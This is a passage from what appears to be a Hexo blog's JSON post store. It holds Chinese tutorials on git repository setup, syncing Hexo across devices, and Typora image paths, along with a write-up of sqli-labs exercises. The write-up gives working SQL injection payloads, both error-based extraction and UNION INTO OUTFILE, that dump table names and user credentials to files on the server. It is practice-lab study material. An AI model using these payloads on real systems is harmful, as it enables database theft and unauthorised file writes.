git@github.com:用户名/仓库名.git\ngit push -u origin main\n```\n","source":"_posts/git新建仓库.md","raw":"---\ntitle: git新建仓库\ndate: 2021-12-04 16:49:31\ntags: \n     - git\n     - github\ncategories: git\ntypora-root-url: ..\n---\n\ngit新建仓库上传代码\n\n<img src=\"/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png\" alt=\"image-20211204165449892\" style=\"zoom: 67%;\" />\n\n首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹\n\n在该文件夹下打开git bash\n\n输入下列命令\n\n```\ngit config --global user.name \"用户名\"\ngit config --global user.email \"邮箱\"\ngit init  会生成.git文件夹\ngit add .\ngit commit -m \"first commit\"\ngit branch -M master\n//使用ssh之前要先配置公钥\ngit remote add origin git@github.com:用户名/仓库名.git\ngit push -u origin main\n```\n","slug":"git新建仓库","published":1,"updated":"2021-12-04T09:03:17.108Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckwrz8yid0001wouy6gf3dxsv","content":"<p>git新建仓库上传代码</p>\n<img src=\"/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png\" alt=\"image-20211204165449892\" style=\"zoom: 67%;\" />\n\n<p>首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹</p>\n<p>在该文件夹下打开git bash</p>\n<p>输入下列命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name &quot;用户名&quot;</span><br><span class=\"line\">git config --global user.email &quot;邮箱&quot;</span><br><span class=\"line\">git init  会生成.git文件夹</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;first commit&quot;</span><br><span class=\"line\">git branch -M master</span><br><span class=\"line\">//使用ssh之前要先配置公钥</span><br><span class=\"line\">git remote add origin git@github.com:用户名/仓库名.git</span><br><span class=\"line\">git push -u origin main</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>git新建仓库上传代码</p>\n<img src=\"/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png\" alt=\"image-20211204165449892\" style=\"zoom: 67%;\" />\n\n<p>首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹</p>\n<p>在该文件夹下打开git bash</p>\n<p>输入下列命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name &quot;用户名&quot;</span><br><span class=\"line\">git config --global user.email &quot;邮箱&quot;</span><br><span class=\"line\">git init  会生成.git文件夹</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;first commit&quot;</span><br><span class=\"line\">git branch -M master</span><br><span class=\"line\">//使用ssh之前要先配置公钥</span><br><span class=\"line\">git remote add origin git@github.com:用户名/仓库名.git</span><br><span class=\"line\">git push -u origin main</span><br></pre></td></tr></table></figure>\n"},{"title":"hexo多设备操作","date":"2021-12-03T18:03:57.000Z","typora-root-url":"..","_content":"\n在终于解决掉hexo图片路径的问题后,再次着手解决hexo多设备更新文章的问题\n\n首先在新设备上面安装Node.js和Git\n\n接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支\n\n![image-20211204031522619](/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png)\n\n确保该分支中文件为空\n\n新建一个hexo文件夹,在该文件夹内打开git bash,生成SSH公钥添加到Github\n\n`git config --global user.name \"yourname\"`\n\n`git config --global user.email \"youremail\"`\n\n可以用这两条命令检查有没有输对\n\n`git config user.name`\n\n`git config user.email`\n\n确保正确后\n\n输入`ssh-keygen -t rsa -C \"youremail\"`\n\n会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在`头像->setting->SSH and GPG keys`下点击`New SSH key`,将复制的公钥粘贴进去,即完成了SSH公钥的添加\n\n在父目录打开git bash\n\n`git clone git@github.com:yourname/yourname.github.io.git hexo` \n\n就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件\n\n接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录\n\n接着安装hexo \n\n`npm install -g hexo cli`\n\n安装一些依赖,不知道哪些有用,反正都装上吧\n\n```bash\nnpm install hexo-generator-index --save\nnpm install hexo-generator-archive --save\nnpm install hexo-generator-category --save\nnpm install hexo-generator-tag --save\nnpm install hexo-server --save\nnpm install hexo-deployer-git --save\nnpm install hexo-deployer-heroku --save\nnpm install hexo-deployer-rsync --save\nnpm install hexo-deployer-openshift --save\nnpm install hexo-renderer-marked@0.2 --save\nnpm install hexo-renderer-stylus@0.2 --save\nnpm install hexo-generator-feed@1 --save\nnpm install hexo-generator-sitemap@1 --save\nnpm install hexo-generator-search --save\nnpm install hexo-generator-searchdb --save\n```\n\n接下来在有.git文件夹的目录下打开git bash\n\n开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去\n\n`git init`\n\n将当前目录下的文件放到暂存区(上膛)\n\n`git add .`\n\n可以用`git status`查看当前文件状态\n\n接着用`git commit -m \"本次提交的描述信息\"`提交描述信息\n\n因为之前已经拉取过,所以这句可以省略`git remote add origin \"远程仓库地址\"`\n\n`git push origin source`这样就成功将文件push到了source目录上面\n\n提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败\n\n提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问\n\n,新电脑只需要拉取source分支并安装需要的软件就能写博客了\n\n需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支\n\n如果不嫌麻烦的话,每次写完文章\n\ngit bash 五连击\n\n```bash\nhexo g\nhexo d\ngit add .\ngit commit -m \"new page\"\ngit push origin source\n```\n\n换设备之后只需要在hexo目录下git pull即可写文章了\n","source":"_posts/hexo多设备操作.md","raw":"---\ntitle: hexo多设备操作\ndate: 2021-12-04 02:03:57\ntags: \n    - hexo \n    - github\n    - github公钥设置\ncategories: hexo\ntypora-root-url: ..\n---\n\n在终于解决掉hexo图片路径的问题后,再次着手解决hexo多设备更新文章的问题\n\n首先在新设备上面安装Node.js和Git\n\n接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支\n\n![image-20211204031522619](/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png)\n\n确保该分支中文件为空\n\n新建一个hexo文件夹,在该文件夹内打开git bash,生成SSH公钥添加到Github\n\n`git config --global user.name \"yourname\"`\n\n`git config --global user.email \"youremail\"`\n\n可以用这两条命令检查有没有输对\n\n`git config user.name`\n\n`git config user.email`\n\n确保正确后\n\n输入`ssh-keygen -t rsa -C \"youremail\"`\n\n会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在`头像->setting->SSH and GPG keys`下点击`New SSH key`,将复制的公钥粘贴进去,即完成了SSH公钥的添加\n\n在父目录打开git bash\n\n`git clone git@github.com:yourname/yourname.github.io.git hexo` \n\n就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件\n\n接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录\n\n接着安装hexo \n\n`npm install -g hexo cli`\n\n安装一些依赖,不知道哪些有用,反正都装上吧\n\n```bash\nnpm install hexo-generator-index --save\nnpm install hexo-generator-archive --save\nnpm install hexo-generator-category --save\nnpm install hexo-generator-tag --save\nnpm install hexo-server --save\nnpm install hexo-deployer-git --save\nnpm install hexo-deployer-heroku --save\nnpm install hexo-deployer-rsync --save\nnpm install hexo-deployer-openshift --save\nnpm install hexo-renderer-marked@0.2 --save\nnpm install hexo-renderer-stylus@0.2 --save\nnpm install hexo-generator-feed@1 --save\nnpm install hexo-generator-sitemap@1 --save\nnpm install hexo-generator-search --save\nnpm install hexo-generator-searchdb --save\n```\n\n接下来在有.git文件夹的目录下打开git bash\n\n开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去\n\n`git init`\n\n将当前目录下的文件放到暂存区(上膛)\n\n`git add .`\n\n可以用`git status`查看当前文件状态\n\n接着用`git commit -m \"本次提交的描述信息\"`提交描述信息\n\n因为之前已经拉取过,所以这句可以省略`git remote add origin \"远程仓库地址\"`\n\n`git push origin source`这样就成功将文件push到了source目录上面\n\n提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败\n\n提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问\n\n,新电脑只需要拉取source分支并安装需要的软件就能写博客了\n\n需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支\n\n如果不嫌麻烦的话,每次写完文章\n\ngit bash 五连击\n\n```bash\nhexo g\nhexo d\ngit add .\ngit commit -m \"new page\"\ngit push origin source\n```\n\n换设备之后只需要在hexo目录下git pull即可写文章了\n","slug":"hexo多设备操作","published":1,"updated":"2021-12-04T09:08:15.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckwrz8yif0003wouy0src1rn4","content":"<p>在终于解决掉hexo图片路径的问题后,再次着手解决hexo多设备更新文章的问题</p>\n<p>首先在新设备上面安装Node.js和Git</p>\n<p>接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支</p>\n<p><img src=\"/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png\" alt=\"image-20211204031522619\"></p>\n<p>确保该分支中文件为空</p>\n<p>新建一个hexo文件夹,在该文件夹内打开git bash,生成SSH公钥添加到Github</p>\n<p><code>git config --global user.name &quot;yourname&quot;</code></p>\n<p><code>git config --global user.email &quot;youremail&quot;</code></p>\n<p>可以用这两条命令检查有没有输对</p>\n<p><code>git config user.name</code></p>\n<p><code>git config user.email</code></p>\n<p>确保正确后</p>\n<p>输入<code>ssh-keygen -t rsa -C &quot;youremail&quot;</code></p>\n<p>会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在<code>头像-&gt;setting-&gt;SSH and GPG keys</code>下点击<code>New SSH key</code>,将复制的公钥粘贴进去,即完成了SSH公钥的添加</p>\n<p>在父目录打开git bash</p>\n<p><code>git clone git@github.com:yourname/yourname.github.io.git hexo</code> </p>\n<p>就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件</p>\n<p>接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录</p>\n<p>接着安装hexo </p>\n<p><code>npm install -g hexo cli</code></p>\n<p>安装一些依赖,不知道哪些有用,反正都装上吧</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-index --save</span><br><span class=\"line\">npm install hexo-generator-archive --save</span><br><span class=\"line\">npm install hexo-generator-category --save</span><br><span class=\"line\">npm install hexo-generator-tag --save</span><br><span class=\"line\">npm install hexo-server --save</span><br><span class=\"line\">npm install hexo-deployer-git --save</span><br><span class=\"line\">npm install hexo-deployer-heroku --save</span><br><span class=\"line\">npm install hexo-deployer-rsync --save</span><br><span class=\"line\">npm install hexo-deployer-openshift --save</span><br><span class=\"line\">npm install hexo-renderer-marked@0.2 --save</span><br><span class=\"line\">npm install hexo-renderer-stylus@0.2 --save</span><br><span class=\"line\">npm install hexo-generator-feed@1 --save</span><br><span class=\"line\">npm install hexo-generator-sitemap@1 --save</span><br><span class=\"line\">npm install hexo-generator-search --save</span><br><span class=\"line\">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>\n\n<p>接下来在有.git文件夹的目录下打开git bash</p>\n<p>开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去</p>\n<p><code>git init</code></p>\n<p>将当前目录下的文件放到暂存区(上膛)</p>\n<p><code>git add .</code></p>\n<p>可以用<code>git status</code>查看当前文件状态</p>\n<p>接着用<code>git commit -m &quot;本次提交的描述信息&quot;</code>提交描述信息</p>\n<p>因为之前已经拉取过,所以这句可以省略<code>git remote add origin &quot;远程仓库地址&quot;</code></p>\n<p><code>git push origin source</code>这样就成功将文件push到了source目录上面</p>\n<p>提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败</p>\n<p>提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问</p>\n<p>,新电脑只需要拉取source分支并安装需要的软件就能写博客了</p>\n<p>需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支</p>\n<p>如果不嫌麻烦的话,每次写完文章</p>\n<p>git bash 五连击</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo g</span><br><span class=\"line\">hexo d</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">&quot;new page&quot;</span></span><br><span class=\"line\">git push origin <span class=\"built_in\">source</span></span><br></pre></td></tr></table></figure>\n\n<p>换设备之后只需要在hexo目录下git pull即可写文章了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在终于解决掉hexo图片路径的问题后,再次着手解决hexo多设备更新文章的问题</p>\n<p>首先在新设备上面安装Node.js和Git</p>\n<p>接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支</p>\n<p><img src=\"/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png\" alt=\"image-20211204031522619\"></p>\n<p>确保该分支中文件为空</p>\n<p>新建一个hexo文件夹,在该文件夹内打开git bash,生成SSH公钥添加到Github</p>\n<p><code>git config --global user.name &quot;yourname&quot;</code></p>\n<p><code>git config --global user.email &quot;youremail&quot;</code></p>\n<p>可以用这两条命令检查有没有输对</p>\n<p><code>git config user.name</code></p>\n<p><code>git config user.email</code></p>\n<p>确保正确后</p>\n<p>输入<code>ssh-keygen -t rsa -C &quot;youremail&quot;</code></p>\n<p>会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在<code>头像-&gt;setting-&gt;SSH and GPG keys</code>下点击<code>New SSH key</code>,将复制的公钥粘贴进去,即完成了SSH公钥的添加</p>\n<p>在父目录打开git bash</p>\n<p><code>git clone git@github.com:yourname/yourname.github.io.git hexo</code> </p>\n<p>就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件</p>\n<p>接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录</p>\n<p>接着安装hexo </p>\n<p><code>npm install -g hexo cli</code></p>\n<p>安装一些依赖,不知道哪些有用,反正都装上吧</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-index --save</span><br><span class=\"line\">npm install hexo-generator-archive --save</span><br><span class=\"line\">npm install hexo-generator-category --save</span><br><span class=\"line\">npm install hexo-generator-tag --save</span><br><span class=\"line\">npm install hexo-server --save</span><br><span class=\"line\">npm install hexo-deployer-git --save</span><br><span class=\"line\">npm install hexo-deployer-heroku --save</span><br><span class=\"line\">npm install hexo-deployer-rsync --save</span><br><span class=\"line\">npm install hexo-deployer-openshift --save</span><br><span class=\"line\">npm install hexo-renderer-marked@0.2 --save</span><br><span class=\"line\">npm install hexo-renderer-stylus@0.2 --save</span><br><span class=\"line\">npm install hexo-generator-feed@1 --save</span><br><span class=\"line\">npm install hexo-generator-sitemap@1 --save</span><br><span class=\"line\">npm install hexo-generator-search --save</span><br><span class=\"line\">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>\n\n<p>接下来在有.git文件夹的目录下打开git bash</p>\n<p>开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去</p>\n<p><code>git init</code></p>\n<p>将当前目录下的文件放到暂存区(上膛)</p>\n<p><code>git add .</code></p>\n<p>可以用<code>git status</code>查看当前文件状态</p>\n<p>接着用<code>git commit -m &quot;本次提交的描述信息&quot;</code>提交描述信息</p>\n<p>因为之前已经拉取过,所以这句可以省略<code>git remote add origin &quot;远程仓库地址&quot;</code></p>\n<p><code>git push origin source</code>这样就成功将文件push到了source目录上面</p>\n<p>提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败</p>\n<p>提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问</p>\n<p>,新电脑只需要拉取source分支并安装需要的软件就能写博客了</p>\n<p>需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支</p>\n<p>如果不嫌麻烦的话,每次写完文章</p>\n<p>git bash 五连击</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo g</span><br><span class=\"line\">hexo d</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">&quot;new page&quot;</span></span><br><span class=\"line\">git push origin <span class=\"built_in\">source</span></span><br></pre></td></tr></table></figure>\n\n<p>换设备之后只需要在hexo目录下git pull即可写文章了</p>\n"},{"title":"mypage1","date":"2021-12-02T07:37:20.000Z","_content":"\n1111111\n","source":"_posts/mypage1.md","raw":"---\ntitle: mypage1\ndate: 2021-12-02 15:37:20\ntags: 111\ncategories: php\n---\n\n1111111\n","slug":"mypage1","published":1,"updated":"2021-12-03T17:11:50.695Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckwrz8yij0007wouyg92f7e7r","content":"<p>1111111</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1111111</p>\n"},{"title":"hexo上传图片","date":"2021-12-02T09:32:02.000Z","typora-root-url":"..","_content":"\n参考文章:\n\nhttps://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/\n\n所有的博客文件保存在_post目录下\n\n在source下新建一个images文件夹\n\n打开Typora的 文件->偏好设置\n\n![](/images/pic-hexo/image-20211203001406102.png)\n\n这样该文章中的图片都会保存在/source/images/文章名/图片名称\n\n现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置\n\n在typora菜单栏点击 格式->图像->设置图片根目录，将hexo/source作为其根目录。\n\n会在md文件中会自动添加这一段\n\n![](/images/pic-hexo/image-20211202174427901.png)\n\n然后在每次写文章时加上上面这句话,就能保证根目录正确了\n","source":"_posts/pic-hexo.md","raw":"---\ntitle: hexo上传图片\ndate: 2021-12-02 17:32:02\ntags: hexo上传图片\ncategories: hexo\ntypora-root-url: ..\n---\n\n参考文章:\n\nhttps://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/\n\n所有的博客文件保存在_post目录下\n\n在source下新建一个images文件夹\n\n打开Typora的 文件->偏好设置\n\n![](/images/pic-hexo/image-20211203001406102.png)\n\n这样该文章中的图片都会保存在/source/images/文章名/图片名称\n\n现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置\n\n在typora菜单栏点击 格式->图像->设置图片根目录，将hexo/source作为其根目录。\n\n会在md文件中会自动添加这一段\n\n![](/images/pic-hexo/image-20211202174427901.png)\n\n然后在每次写文章时加上上面这句话,就能保证根目录正确了\n","slug":"pic-hexo","published":1,"updated":"2021-12-02T16:27:38.159Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckwrz8yik0009wouy15kb835d","content":"<p>参考文章:</p>\n<p><a href=\"https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/\">https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</a></p>\n<p>所有的博客文件保存在_post目录下</p>\n<p>在source下新建一个images文件夹</p>\n<p>打开Typora的 文件-&gt;偏好设置</p>\n<p><img src=\"/images/pic-hexo/image-20211203001406102.png\"></p>\n<p>这样该文章中的图片都会保存在/source/images/文章名/图片名称</p>\n<p>现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置</p>\n<p>在typora菜单栏点击 格式-&gt;图像-&gt;设置图片根目录，将hexo/source作为其根目录。</p>\n<p>会在md文件中会自动添加这一段</p>\n<p><img src=\"/images/pic-hexo/image-20211202174427901.png\"></p>\n<p>然后在每次写文章时加上上面这句话,就能保证根目录正确了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>参考文章:</p>\n<p><a href=\"https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/\">https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</a></p>\n<p>所有的博客文件保存在_post目录下</p>\n<p>在source下新建一个images文件夹</p>\n<p>打开Typora的 文件-&gt;偏好设置</p>\n<p><img src=\"/images/pic-hexo/image-20211203001406102.png\"></p>\n<p>这样该文章中的图片都会保存在/source/images/文章名/图片名称</p>\n<p>现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置</p>\n<p>在typora菜单栏点击 格式-&gt;图像-&gt;设置图片根目录，将hexo/source作为其根目录。</p>\n<p>会在md文件中会自动添加这一段</p>\n<p><img src=\"/images/pic-hexo/image-20211202174427901.png\"></p>\n<p>然后在每次写文章时加上上面这句话,就能保证根目录正确了</p>\n"},{"title":"sqli-labs","date":"2021-12-02T08:16:28.000Z","typora-root-url":"..","_content":"\n##### less3 less4\n\nless3   less4\n\nless4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入\n\n通过单引号报错信息\n\n推测可能在接收参数后添加了( )包裹了id参数\n\n![](/images/sqli-labs/Image.png)\n\n![](/images/sqli-labs/Image%20%5B1%5D.png)\n\n通过构造闭合即可\n\nid=1')%23\n\n接下来用union联合注入即可\n\nless4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1\") and 1=1%23\n\n根据报错注入公式,开始操作\n\n库名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select database())))%23\n```\n\n表名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='security')))%23\n```\n\n列名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users')))%23\n```\n\n利用right和left函数相互配合爆出字段名s\n\n```sql\nid=1\")and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23\n```\n\n如法炮制,爆数据即可\n\n##### less 7\n\n本题经过尝试得到后台为((' '))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入\n1.要使用outfile首先要知道绝对路径\n\n通过之前的less进行查询\n\n@@basedir是mysql安装路径\n\n@@datadir是数据库路径\n\n![](/images/sqli-labs/1.png)\n\n2.读写权限测试mysql快速查看读写权限\n\n```sql\nshow variables like '%secure%';\n```\n\n![](/images/sqli-labs/2.png)\n\n```sql\nid=1')) and (select count(*) from mysql.user)>0%23\n```\n\n如果返回正常,则说明有读写权限\n\n![](/images/sqli-labs/3.png)\n\n其次在linux中还需要mysql用户对目录有w权限才能写入\n\n```sql\nid=1%27))%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema%20=%27security%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/2.txt%27%23\n```\n\n通过上述语句查询表名,写入到2.txt\n\n![](/images/sqli-labs/4.png)\n\n貌似文件只能新建,不能重复写入\n查询列名\n\n```sql\nid=1%27))%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/3.txt%27%23\n```\n\n查询数据\n\n```sql\nid=1%27))%20union%20select%201,username,password%20from%20security.users%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/4.txt%27%23\n```\n\n","source":"_posts/sqli-labs.md","raw":"---\ntitle: sqli-labs\ndate: 2021-12-02 16:16:28\ntags: sqli-labs\ncategories: sqli\ntypora-root-url: ..\n---\n\n##### less3 less4\n\nless3   less4\n\nless4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入\n\n通过单引号报错信息\n\n推测可能在接收参数后添加了( )包裹了id参数\n\n![](/images/sqli-labs/Image.png)\n\n![](/images/sqli-labs/Image%20%5B1%5D.png)\n\n通过构造闭合即可\n\nid=1')%23\n\n接下来用union联合注入即可\n\nless4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1\") and 1=1%23\n\n根据报错注入公式,开始操作\n\n库名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select database())))%23\n```\n\n表名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='security')))%23\n```\n\n列名\n\n```sql\nid=1\")and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users')))%23\n```\n\n利用right和left函数相互配合爆出字段名s\n\n```sql\nid=1\")and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23\n```\n\n如法炮制,爆数据即可\n\n##### less 7\n\n本题经过尝试得到后台为((' '))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入\n1.要使用outfile首先要知道绝对路径\n\n通过之前的less进行查询\n\n@@basedir是mysql安装路径\n\n@@datadir是数据库路径\n\n![](/images/sqli-labs/1.png)\n\n2.读写权限测试mysql快速查看读写权限\n\n```sql\nshow variables like '%secure%';\n```\n\n![](/images/sqli-labs/2.png)\n\n```sql\nid=1')) and (select count(*) from mysql.user)>0%23\n```\n\n如果返回正常,则说明有读写权限\n\n![](/images/sqli-labs/3.png)\n\n其次在linux中还需要mysql用户对目录有w权限才能写入\n\n```sql\nid=1%27))%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema%20=%27security%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/2.txt%27%23\n```\n\n通过上述语句查询表名,写入到2.txt\n\n![](/images/sqli-labs/4.png)\n\n貌似文件只能新建,不能重复写入\n查询列名\n\n```sql\nid=1%27))%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/3.txt%27%23\n```\n\n查询数据\n\n```sql\nid=1%27))%20union%20select%201,username,password%20from%20security.users%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/4.txt%27%23\n```\n\n","slug":"sqli-labs","published":1,"updated":"2021-12-02T09:44:37.539Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckwrz8yil000awouybi10gopb","content":"<h5 id=\"less3-less4\"><a href=\"#less3-less4\" class=\"headerlink\" title=\"less3 less4\"></a>less3 less4</h5><p>less3   less4</p>\n<p>less4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入</p>\n<p>通过单引号报错信息</p>\n<p>推测可能在接收参数后添加了( )包裹了id参数</p>\n<p><img src=\"/images/sqli-labs/Image.png\"></p>\n<p><img 